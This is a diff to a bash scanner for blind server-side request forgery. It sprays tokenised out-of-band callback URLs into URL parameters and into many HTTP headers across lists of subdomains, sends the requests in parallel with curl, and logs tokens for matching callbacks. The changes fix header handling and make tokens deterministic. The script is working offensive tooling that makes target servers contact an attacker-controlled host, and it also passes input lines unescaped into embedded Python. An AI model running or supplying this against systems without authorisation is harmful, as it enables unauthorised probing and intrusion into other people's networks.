@@ -1,15 +1,5 @@
 #!/usr/bin/env bash
-# ssrf_blinder_minimal.sh
-# Minimal, single-token-map SSRF blinder:
-# - One param token per matched endpoint (param_tests.txt)
-# - One header token per (unique subdomain, header)
-# - Records only:
-#     - tokens_map.tsv (all tokens mapping)
-#     - param_tests.txt (param-injected URLs)
-#     - sent_requests.log (what we sent + HTTP code)
-#
-# Usage:
-#   ./ssrf_blinder_minimal.sh <OAST_ROOT> <ssrf.txt> [ssrf_headers.txt] [concurrency]
+# ssrf_blinder_minimal.sh (fixed: pass headers into python as Python literal)
 set -euo pipefail
 IFS=$'\n\t'
 
@@ -52,6 +42,9 @@ if [[ -n "$HEADERS_FILE" && -f "$HEADERS_FILE" ]]; then
 else
   HEADERS=("${DEFAULT_HEADERS[@]}")
 fi
+
+# prepare Python list literal for headers so python heredocs receive valid Python code
+HEADERS_PY_REPR="["$(printf "'%s'," "${HEADERS[@]}" | sed "s/,$//")"]"
 
 echo "[INFO] OAST root: $OAST_ROOT"
 echo "[INFO] ssrf file: $SSRF_FILE"
@@ -123,23 +116,26 @@ IFS=$'\n\t'
 LINE="$1"
 WORKDIR="$(cd "$(dirname "$0")" && pwd)/.."
 SENT_LOG="$WORKDIR/sent_requests.log"
-# the injected URL contains the token in the query value host, extract token
-# parse host from injected URL:
+# extract token host from LINE (best-effort)
 token_host=$(python3 - <<PY
-from urllib.parse import urlparse
+from urllib.parse import urlparse, parse_qsl
+import re,sys
 u = """${LINE}"""
 try:
-    p = urlparse(u)
-    # find token by scanning query values for a host matching pattern token.oastroot
-    qs = p.query
-    # best effort: extract host substring from qs value
-    # fallback: take substring between 'http://' and first '/' or '&'
-    import re
-    m = re.search(r'http://([^/:&\\?]+)', qs)
+    # search for http://<host> inside the query string or path
+    m = re.search(r'http://([^/:&\?]+)', u)
     if m:
         print(m.group(1))
     else:
-        print("")
+        # fallback: try to find any hostname-like substring
+        p = urlparse(u)
+        # scan query values
+        qs = p.query
+        m2 = re.search(r'http://([^/:&\?]+)', qs)
+        if m2:
+            print(m2.group(1))
+        else:
+            print("")
 except Exception:
     print("")
 PY
@@ -153,7 +149,6 @@ now=$(date -Iseconds)
 printf "%s\t%s\t%s\t%s\t%s\t%s\n" "$now" "$token" "$payload" "$LINE" "PARAM" "$http_code" >> "$SENT_LOG"
 WEND
 chmod +x "$WORKER_P"
-# normalize worker line endings
 sed -i 's/\r$//' "$WORKER_P" || true
 
 echo "[INFO] Running param tests (concurrency=$CONCURRENCY)..."
@@ -181,7 +176,36 @@ PY
 NUM_SUBS=$(wc -l < "$WORKDIR/tmp_subdomains.txt" || echo 0)
 echo "[INFO] Found $NUM_SUBS unique subdomain(s) to fuzz headers."
 
-# Step 4: create header tokens and run header worker (no extra persistent queue file)
+# Step 4: create header tokens and run header worker (deterministic: build tokens first, then stream jobs)
+# Build a list of job lines and write mapping deterministically so tokens in TOKENS_MAP match executed jobs
+JOB_FILE="$(mktemp)"
+MAP_TMP="$(mktemp)"
+python3 - <<PY > "$JOB_FILE"
+import hashlib, time
+oast = """${OAST_ROOT}"""
+headers = ${HEADERS_PY_REPR}
+with open("${WORKDIR}/tmp_subdomains.txt","r") as f:
+    subs=[s.strip() for s in f if s.strip()]
+for sub in subs:
+    for hdr in headers:
+        # deterministic token based on sub+hdr (stable across runs)
+        token = hashlib.sha1((sub + "|" + hdr).encode()).hexdigest()[:12]
+        payload = token + "." + oast
+        print(sub + "\t" + token + "\t" + payload + "\tHDR:" + hdr)
+PY
+
+# append corresponding mapping lines to TOKENS_MAP (HEADER entries)
+python3 - <<PY >> "$TOKENS_MAP"
+from datetime import datetime
+oast = """${OAST_ROOT}"""
+with open("${JOB_FILE}","r") as fh:
+    for line in fh:
+        sub,token,payload,meta = line.strip().split('\t',3)
+        ts = datetime.now().isoformat()
+        print(f"{token}\t{payload}\tHEADER\t{sub}\t{meta.replace('HDR:','HEADER:')}\t{ts}")
+PY
+
+# worker that performs a header request (reads one job line)
 WORKER_H="$(mktemp --suffix=_worker_header.sh)"
 cat > "$WORKER_H" <<'WEND'
 #!/usr/bin/env bash
@@ -190,11 +214,9 @@ IFS=$'\n\t'
 LINE="$1"
 WORKDIR="$(cd "$(dirname "$0")" && pwd)/.."
 SENT_LOG="$WORKDIR/sent_requests.log"
-# LINE format: subdomain<TAB>token<TAB>payload<TAB>HDR:<headername>
 IFS=$'\t' read -r sub token payload meta <<< "$LINE" || true
 hdr="${meta#HDR:}"
 CURL=(--silent --max-time 12 --output /dev/null --write-out "%{http_code}")
-# choose https by default
 tgt="https://${sub}"
 http_code=$(curl "${CURL[@]}" -H "${hdr}: http://${payload}" "$tgt" 2>/dev/null) || http_code="ERR"
 now=$(date -Iseconds)
@@ -203,46 +225,11 @@ WEND
 chmod +x "$WORKER_H"
 sed -i 's/\r$//' "$WORKER_H" || true
 
-# build a temporary header queue in-memory via a process substitution to avoid persistent queue files
 echo "[INFO] Sending header tests (headers × subdomains) ..."
+cat "$JOB_FILE" | xargs -d '\n' -P "$CONCURRENCY" -I '{}' "$WORKER_H" '{}'
 
-# Build lines and stream them into xargs for parallel processing
-# Format per line: subdomain<TAB>token<TAB>payload<TAB>HDR:<headername>
-python3 - <<PY | xargs -d '\n' -P "$CONCURRENCY" -I '{}' "$WORKER_H" '{}'
-import sys,hashlib,time
-oast = """${OAST_ROOT}"""
-headers = ${HEADERS}
-with open("${WORKDIR}/tmp_subdomains.txt","r") as f:
-    subs=[s.strip() for s in f if s.strip()]
-for sub in subs:
-    for hdr in headers:
-        token = hashlib.sha1((sub + hdr + str(time.time())).encode()).hexdigest()[:12]
-        payload = token + "." + oast
-        ts = ""  # not writing timestamp here; mapping saved next via echo below in bash
-        print(sub + "\t" + token + "\t" + payload + "\t" + "HDR:" + hdr)
-PY
-
-# while creating header jobs above we must also persist mapping lines to TOKENS_MAP
-# regenerate the same sequence deterministically to write tokens into TOKENS_MAP
-python3 - <<PY >> "$TOKENS_MAP"
-import sys,hashlib,time
-oast = """${OAST_ROOT}"""
-headers = ${HEADERS}
-with open("${WORKDIR}/tmp_subdomains.txt","r") as f:
-    subs=[s.strip() for s in f if s.strip()]
-for sub in subs:
-    for hdr in headers:
-        token = hashlib.sha1((sub + hdr + str(time.time())).encode()).hexdigest()[:12]
-        payload = token + "." + oast
-        from datetime import datetime
-        ts = datetime.now().isoformat()
-        # token<TAB>payload<TAB>HEADER<TAB>subdomain<TAB>HEADER:<hdr><TAB>ts
-        print(f"{token}\t{payload}\tHEADER\t{sub}\tHEADER:{hdr}\t{ts}")
-PY
-
-# cleanup worker scripts and tmp files
-rm -f "$WORKER_H"
-rm -f "$WORKDIR/tmp_subdomains.txt"
+# cleanup
+rm -f "$WORKER_H" "$JOB_FILE" "$WORKDIR/tmp_subdomains.txt"
 
 echo
 echo "[DONE] All requests sent."
